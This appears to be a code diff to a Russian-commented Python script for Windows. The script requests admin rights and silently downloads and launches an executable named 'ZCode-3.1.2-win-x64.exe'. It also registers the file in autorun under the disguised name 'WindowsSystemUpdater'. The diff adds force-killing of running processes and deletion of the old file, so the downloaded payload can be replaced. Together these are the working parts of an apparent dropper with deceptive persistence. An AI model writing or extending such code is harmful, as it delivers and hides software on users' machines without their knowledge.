@@ -6,6 +6,7 @@ import tempfile
 import logging
 import sys
 import ctypes
+import time
 from pathlib import Path
 
 # Определяем папку запуска скрипта
@@ -26,14 +27,60 @@ def is_admin():
     except:
         return False
 
-def write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg):
+def write_final_log(del_ok, del_msg, dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg):
     """Запись итогового отчета в файл"""
     with open(LOG_FILE, 'a', encoding='utf-8') as f:
-        f.write("\n--- ИТОГОВЫЙ ОТЧЕТ ---\n")
-        f.write(f"Скачивание: {'успешно' if dl_ok else 'провал'} причина: {dl_msg if not dl_ok else 'N/A'}\n")
+        f.write("\n--- ИТОГОВЫЙ ОТЧЕТ (ОБНОВЛЕНИЕ) ---\n")
+        f.write(f"Удаление старого exe: {'успешно' if del_ok else 'провал'} причина: {del_msg if not del_ok else 'N/A'}\n")
+        f.write(f"Скачивание нового: {'успешно' if dl_ok else 'провал'} причина: {dl_msg if not dl_ok else 'N/A'}\n")
         f.write(f"Запуск: {'успешно' if run_ok else 'провал'} причина: {run_msg if not run_ok else 'N/A'}\n")
         f.write(f"Автозагрузка: {'успешно' if auto_ok else 'провал'} причина: {auto_msg if not auto_ok else 'N/A'}\n")
         f.write("--- КОНЕЦ ОТЧЕТА ---\n")
+
+def kill_process_by_path(exe_path):
+    """Принудительно завершает процессы, использующие указанный exe-файл"""
+    try:
+        import psutil
+        killed = False
+        for proc in psutil.process_iter(['pid', 'exe']):
+            try:
+                if proc.info['exe'] and os.path.normpath(proc.info['exe']) == os.path.normpath(exe_path):
+                    proc.kill()
+                    killed = True
+                    time.sleep(0.3)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        return killed, "процессы завершены" if killed else "процессов не найдено"
+    except ImportError:
+        # Если psutil нет - используем taskkill
+        try:
+            subprocess.run(
+                f'taskkill /F /IM "{os.path.basename(exe_path)}"',
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            return True, "taskkill выполнен"
+        except:
+            return False, "не удалось завершить процессы"
+
+def delete_file_with_retry(file_path, max_retries=5):
+    """Удаление файла с повторными попытками"""
+    for attempt in range(max_retries):
+        try:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+                return True, "удален"
+            else:
+                return True, "файл отсутствовал"
+        except PermissionError:
+            # Файл заблокирован - пробуем убить процесс
+            kill_process_by_path(file_path)
+            time.sleep(0.5)
+        except Exception as e:
+            time.sleep(0.3)
+    return False, f"не удалось удалить после {max_retries} попыток"
 
 def download_file(url, dest):
     try:
@@ -96,7 +143,7 @@ def main():
     target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
     reg_name = "WindowsSystemUpdater"
     
-    # Попытка запроса админ-прав
+    # Проверка админ-прав
     if not is_admin():
         try:
             ctypes.windll.shell32.ShellExecuteW(
@@ -108,25 +155,32 @@ def main():
             target_exe = os.path.join(target_dir, "ZCode-3.1.2-win-x64.exe")
             logging.warning("Админ прав нет, используется Temp")
     
-    # 1. Скачивание
+    # 1. Удаление старого exe
+    del_ok, del_msg = delete_file_with_retry(target_exe)
+    if del_ok:
+        logging.info(f"Удаление: успешно - {del_msg}")
+    else:
+        logging.error(f"Удаление: провал - {del_msg}")
+    
+    # 2. Скачивание нового
     dl_ok, dl_msg = download_file(url, target_exe)
     if not dl_ok:
         logging.info(f"Скачивание: провал причина: {dl_msg}")
-        write_final_log(dl_ok, dl_msg, False, "не выполнялся", False, "не выполнялся")
+        write_final_log(del_ok, del_msg, dl_ok, dl_msg, False, "не выполнялся", False, "не выполнялся")
         return
     
-    # 2. Запуск
+    # 3. Запуск
     run_ok, run_msg = run_exe_silent(target_exe)
     if not run_ok:
         logging.info(f"Запуск: провал причина: {run_msg}")
     
-    # 3. Автозагрузка
+    # 4. Автозагрузка (обновляем запись, если изменился путь)
     auto_ok, auto_msg = add_to_autorun(reg_name, target_exe)
     if not auto_ok:
         logging.info(f"Автозагрузка: провал причина: {auto_msg}")
     
     # Запись итогового отчета
-    write_final_log(dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg)
+    write_final_log(del_ok, del_msg, dl_ok, dl_msg, run_ok, run_msg, auto_ok, auto_msg)
 
 if __name__ == "__main__":
     main()
